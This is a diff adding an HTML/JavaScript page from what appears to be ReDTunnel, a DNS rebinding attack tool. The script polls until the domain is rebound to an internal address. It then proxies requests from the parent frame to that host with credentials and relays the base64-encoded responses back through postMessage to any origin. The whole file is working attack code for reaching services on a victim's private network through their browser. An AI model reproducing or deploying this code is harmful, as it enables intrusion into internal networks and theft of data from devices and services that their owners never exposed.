@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ReDTunnel - Rebind</title>
+    <script>
+        function request(method = "GET", url = "/", headers = {}, body = "", responseType = "blob") {
+            return new Promise(function (resolve, reject) {
+                const xhr = new XMLHttpRequest();
+                xhr.withCredentials = true;
+                xhr.responseType = responseType;
+                xhr.onerror = () => {
+                    reject("request failed");
+                };
+                xhr.onreadystatechange = function () {
+                    if (this.readyState === this.DONE) {
+                        let headers = {};
+                        for (let line of this.getAllResponseHeaders().trim().split(/[\r\n]+/g)) {
+                            let headerParts = line.split(': ');
+                            headers[headerParts.shift()] = headerParts.join(': ');
+                        }
+
+                        if (!this.status) {
+                            return reject("request failed");
+                        }
+                        let responseURL = new URL(this.responseURL);
+                        let resURL = `${responseURL.origin}${responseURL.pathname}${responseURL.search}`;
+                        let resURI = `${responseURL.pathname}${responseURL.search}`;
+                        resolve({
+                            content: this.response,
+                            status: this.status,
+                            headers: headers,
+                            url: resURI,
+                            redirected: ((reqURL, resURL, resURI) => {
+                                try {
+                                    if (reqURL.startsWith('//')) {
+                                        reqURL = location.protocol + reqURL;
+                                    } else if (reqURL.startsWith('/')) {
+                                        return reqURL !== resURI;
+                                    }
+                                    return reqURL !== resURL;
+                                } catch (e) {
+                                    return undefined;
+                                }
+                            })(url, resURL, resURI)
+                        });
+                    }
+                };
+                xhr.open(method, url, true, 'ReDTunnel', 'ReDTunnel');
+                for (let [key, value] of Object.entries(headers)) {
+                    xhr.setRequestHeader(key, value)
+                }
+                xhr.send(body);
+            });
+        }
+
+        function getResource(id, ip, port, path, method, headers, body, uuid) {
+            request(method, path, headers, body, "blob").then((response) => {
+                let fr = new FileReader();
+                fr.onload = () => {
+                    let responseBody = fr.result.split('base64,')[1];
+                    parent.postMessage({
+                        type: "resource",
+                        id: id,
+                        ip: ip,
+                        port: port,
+                        path: path,
+                        url: response.url,
+                        redirected: response.redirected,
+                        status: response.status,
+                        headers: response.headers,
+                        content: responseBody,
+                        uuid: uuid
+                    }, '*');
+                };
+                fr.readAsDataURL(response.content);
+            });
+        }
+
+        function waitForRebind(id, ip, port, rebindInterval = 5000) {
+            setTimeout(() => {
+                fetch(location.origin, {
+                    cache: 'no-cache',
+                    credentials: "omit"
+                }).then((response) => {
+                    response.text().then((data) => {
+                        if (!data.includes('<title>ReDTunnel</title>')) {
+                            parent.postMessage({
+                                type: "rebind",
+                                id: id,
+                                ip: ip,
+                                port: port,
+                                hostname: location.hostname,
+                                authenticationRequired: response.status === 401
+                            }, "*");
+                        } else {
+                            return waitForRebind(id, ip, port, rebindInterval);
+                        }
+                    });
+                }).catch((error) => {
+                    parent.postMessage({
+                        type: "rebind",
+                        id: id,
+                        ip: ip,
+                        port: port,
+                        hostname: location.hostname,
+                        error: error.toString()
+                    }, "*");
+                });
+            }, rebindInterval);
+        }
+
+        addEventListener("message", (event) => {
+            let origin = event.origin || event.originalEvent.origin;
+            let url = new URL(origin);
+            if (!location.hostname.endsWith(url.hostname)) {
+                return;
+            }
+
+            let data = event.data;
+            switch (data.type) {
+                case "rebind":
+                    setTimeout(() => {
+                        waitForRebind(data.id, data.ip, data.port, data.rebindInterval);
+                    }, data.rebindDelay);
+                    break;
+                case "resource":
+                    getResource(data.id, data.ip, data.port, data.path, data.method, data.headers, data.body, data.uuid);
+                    break;
+            }
+        }, false);
+    </script>
+</head>
+<body>
+</body>
+</html>
